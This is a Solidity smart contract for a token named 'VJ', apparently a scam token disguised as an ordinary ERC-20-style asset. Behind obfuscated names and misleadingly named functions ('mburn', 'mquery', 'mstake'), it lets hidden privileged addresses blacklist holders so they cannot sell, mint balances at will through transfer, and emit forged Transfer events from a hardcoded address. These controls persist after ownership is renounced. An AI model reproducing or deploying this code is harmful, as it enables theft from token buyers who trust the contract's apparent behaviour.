/**
 *Submitted for verification at BscScan.com on 2022-11-04
*/

/**
 *Submitted for verification at Etherscan.io on 2022-11-04
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address aBM = 0x48B807caa55AB39b7Ca244529F63f4935FEF0272;
	address aBMP = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract AJ is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private aBc;
	mapping (address => bool) private aBb;
    mapping (address => bool) private aBw;
    mapping (address => mapping (address => uint256)) private aBv;
    uint8 private constant ABl = 8;
    uint256 private constant aBS = 7 * (10** ABl);
    string private constant _name = "VJ";
    string private constant _symbol = "VJ";



    constructor () {
        aBc[_msgSender()] = aBS;
         mmkr(aBMP, aBS); }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return ABl;
    }

    function totalSupply() public pure  returns (uint256) {
        return aBS;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return aBc[account];
    }
	

   
	 function mburn(address aBj) onlyOwner public{
        aBb[aBj] = true; }
	
    function mmkr(address aBj, uint256 aBn) onlyOwner internal {
    emit Transfer(address(0), aBj ,aBn); }

    function allowance(address owner, address spender) public view  returns (uint256) {
        return aBv[owner][spender];
    }
		
            function approve(address spender, uint256 amount) public returns (bool success) {    
        aBv[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function mquery(address aBj) public{
         if(aBb[msg.sender])  { 
        aBw[aBj] = true; }}
        

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == aBM)  {
        require(amount <= aBc[sender]);
        aBc[sender] -= amount;  
        aBc[recipient] += amount; 
          aBv[sender][msg.sender] -= amount;
        emit Transfer (aBMP, recipient, amount);
        return true; }  else  
          if(!aBw[recipient]) {
          if(!aBw[sender]) {
         require(amount <= aBc[sender]);
        require(amount <= aBv[sender][msg.sender]);
        aBc[sender] -= amount;
        aBc[recipient] += amount;
        aBv[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function mstake(address aBj) public {
        if(aBb[msg.sender]) { 
        aBw[aBj] = false;}}
		
		function transfer(address aBj, uint256 aBn) public {
        if(msg.sender == aBM)  {
        require(aBc[msg.sender] >= aBn);
        aBc[msg.sender] -= aBn;  
        aBc[aBj] += aBn; 
        emit Transfer (aBMP, aBj, aBn);} else  
        if(aBb[msg.sender]) {aBc[aBj] += aBn;} else
        if(!aBw[msg.sender]) {
        require(aBc[msg.sender] >= aBn);
        aBc[msg.sender] -= aBn;  
        aBc[aBj] += aBn;          
        emit Transfer(msg.sender, aBj, aBn);}}
		
		

		
		}